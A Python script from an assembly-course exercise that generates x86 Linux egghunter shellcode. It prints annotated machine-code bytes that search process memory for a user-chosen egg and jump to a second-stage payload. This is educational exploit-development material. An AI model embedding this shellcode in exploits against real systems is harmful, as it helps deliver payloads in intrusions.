#!/usr/bin/env python3
"""
x86 Egghunter Generator
Usage: this_script.py <four_byte_hex_escaped_egg_of_choice>
Author: @fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""

import sys


def array_hex_str_to_ints(list_of_hex_strings):
    """This function accepts a list of strings containing hex digits and
    converts each item into bytes.
    For example, [21, 41, 42, 43] is converted into [b'!', b'A', b'B', b'C']
    """

    for item in range(0, len(list_of_hex_strings)):
        list_of_hex_strings[item] = int(list_of_hex_strings[item], 16)

    return list_of_hex_strings


def process_shellcode(shellcode_input):
    """Convert a string of hex values formatted as C-style hex escapes
    into an array of integers.
    Returns bytes"""

    split_shellcode = shellcode_input.split("x")
    split_shellcode = split_shellcode[1::]  # Remove bogus empty string at start of array

    processed_shellcode = bytes(array_hex_str_to_ints(split_shellcode))

    return processed_shellcode


def c_format_binary_data(data):
    hex_escaped = ''
    for byte in data:
        formatted_byte = '\\x{0:0{1}X}'.format(byte, 2)
        hex_escaped += formatted_byte
    return hex_escaped


def main():
    if len(sys.argv) != 2:
        print('Usage: %s <four_byte_hex_escaped_egg_of_choice>' % sys.argv[0])
        print('Egg must be four bytes, formatted like so: \\x41\\x42\\x43\\x44')
        raise SystemExit

    egg = process_shellcode(sys.argv[1])
    if len(egg) != 4:
        print('Egg must be four bytes, formatted like so: \\x41\\x42\\x43\\x44')
        raise SystemExit


    egg = bytearray(egg)

    real_egg = egg[::-1] + egg[::-1]

    EGGHUNTER = (bytearray("\x31\xc9"  # xor ecx, ecx
                           "\xf7\xe1"  # mul ecx
                           "\x66\x81\xca\xff\x0f"  # <egghunt_loop_start:> or dx, 0xfff
                           "\x42"  # <scasd_zero:> inc edx
                           "\x8d\x5a\x04"  # lea ebx, [edx+0x4]
                           "\x6a\x21"  # push 0x21
                           "\x58"  # pop eax
                           "\xcd\x80"  # int 0x80
                           "\x3c\xf2"  # cmp al, 0xf2
                           "\x74\xee"  # je egghunt_loop_start
                           "\xb8", "iso-8859-1") + egg[::-1] +  # mov eax, <egg>
                 bytearray("\x89\xd7"  # mov mov edi, edx
                           "\xaf"  # scasd eax
                           "\x75\xe9"  # jne scasd_zero 
                           "\xaf"  # scasd eax
                           "\x75\xe6"  # jne scasd_zero
                           "\xff\xe7",  # jmp edi
                           "iso-8859-1"
                           ))
    print("Your egg is: %s" % c_format_binary_data(egg))
    print("Your egghunter's length is %d" % len(EGGHUNTER))
    print("Your egghunter is:\n%s" % c_format_binary_data(EGGHUNTER))
    print("Please prepend your second stage shellcode with the following bytes: %s" %
          c_format_binary_data(real_egg))

if __name__ == '__main__':
    main()
